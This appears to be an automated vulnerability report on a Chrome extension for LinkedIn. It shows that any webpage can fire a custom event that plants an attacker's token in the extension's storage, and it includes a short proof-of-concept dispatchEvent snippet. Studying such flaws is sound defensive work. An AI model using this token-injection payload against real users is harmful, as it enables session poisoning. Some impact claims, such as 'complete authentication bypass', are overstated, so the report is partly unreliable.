# CoCo Analysis: fbicofgfebniiolmkomflpaecddappka

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_encryptedTokenEvent → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fbicofgfebniiolmkomflpaecddappka/opgen_generated_files/cs_1.js
Line 474	window.addEventListener('encryptedTokenEvent', function (e) {
Line 476	    chrome.storage.local.set({ encryptedToken: e.detail.encryptedToken }, function () {

**Code:**

```javascript
// Content script auth/index.js (cs_1.js lines 474-479)
// Entry point - Custom event listener on <all_urls>
window.addEventListener('encryptedTokenEvent', function (e) {
    chrome.storage.local.set({ encryptedToken: e.detail.encryptedToken }, function () { // ← attacker-controlled
        console.log('Encrypted token stored.');
    });
});

// Content script linkedin/index.js (cs_0.js lines 5418-5427)
// Storage retrieval and usage
chrome.storage.local.get(['encryptedToken'], (result) => {
    encryptedToken = result.encryptedToken; // ← retrieves poisoned token

    if (encryptedToken) {
        try {
            const { data } = await fetchUserData(encryptedToken); // ← sends to API
            // ... uses token for authentication
        }
    }
});

// API request with poisoned token (cs_0.js lines 1169-1172)
const fetchUserData = (encryptedToken) => {
    const encodedToken = encodeURIComponent(encryptedToken);
    const { data } = await axios.get(
        `https://927ak4agmc.execute-api.eu-central-1.amazonaws.com/Prod/user-data?encryptedToken=${encodedToken}` // ← attacker's token sent to API
    );
    return { data };
};

// Token also used in other API calls (cs_0.js line 525)
const comment = await fetchAIContentHandler(
    "/comment-to-post",
    { post: { text: postText, author: postAuthor }, selectedValue, mainComment, relevantThread, answeringTo, encryptedToken }, // ← attacker's token
    button,
    actionsContainer
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Custom DOM event listener

**Attack:**

```javascript
// Malicious webpage on ANY domain (content script runs on <all_urls>)
window.dispatchEvent(new CustomEvent('encryptedTokenEvent', {
    detail: {
        encryptedToken: 'attacker-controlled-token-value'
    }
}));

// The extension will:
// 1. Store the attacker's token in chrome.storage.local
// 2. Retrieve it when user visits LinkedIn
// 3. Send it to the extension's backend API in authentication requests
// 4. Use it for all subsequent API calls (user data, comment generation, etc.)
```

**Impact:** Complete authentication bypass and session hijacking. An attacker can poison the user's authentication token by triggering a custom event from any webpage. The extension will then use the attacker's token for all API requests to its backend (https://927ak4agmc.execute-api.eu-central-1.amazonaws.com/Prod). This allows the attacker to:
1. Make the extension authenticate with the attacker's account instead of the user's account
2. Exfiltrate user data by having the extension send requests with a token the attacker controls
3. Perform actions on LinkedIn using the attacker's credentials through the extension
4. Potentially hijack or monitor the user's TopVoice account activity

The vulnerability exists because:
- Content script runs on <all_urls> (manifest.json line 38-44)
- No origin validation on the custom event listener
- Storage is used as a trusted data source without validation
- Complete storage exploitation chain: attacker → storage.set → storage.get → API requests with attacker-controlled token
